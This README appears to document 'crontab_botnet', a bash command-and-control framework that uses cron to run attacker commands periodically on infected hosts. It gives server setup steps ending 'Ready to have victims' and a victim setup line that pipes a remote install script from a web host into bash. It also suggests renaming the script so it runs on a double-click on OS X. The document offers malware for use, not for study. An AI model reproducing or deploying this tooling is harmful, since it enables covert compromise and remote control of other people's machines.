# crontab_botnet
A botnet (C&amp;C) framework that create in bash and using crontab for periodic execute

## Server Side Setup (Plain Text Version)
1. Put the folder under any kind of web server, which can be, but not limited to:
```
IIS
Nginx
Apache
Python Simple HTTP Server
```
2. Change the domain and path in `install.sh` and `bd.sh`.
3. follow the instrustion for writing a command file
4. Ready to have victims

## Server Side Setup (With PHP uploader)
1. Setup a LAMP server.
2. Put the file to a folder which can be accessed on the network.
3. Change the domain and path in `install.sh` and `bd.sh`.
4. follow the instrustion for writing a command file
5. Ready to have victims

## Victim Setup
- `curl http://example.com/install.sh | bash`
- You can also rename the file install.sh to install.command, and double-click the file on OS X system to execute it.

## Command File
The name of command file is `command_list`, there is a simple command list call `command_list_example`.
You can change the domain and path in the example file, and feel free to use it.
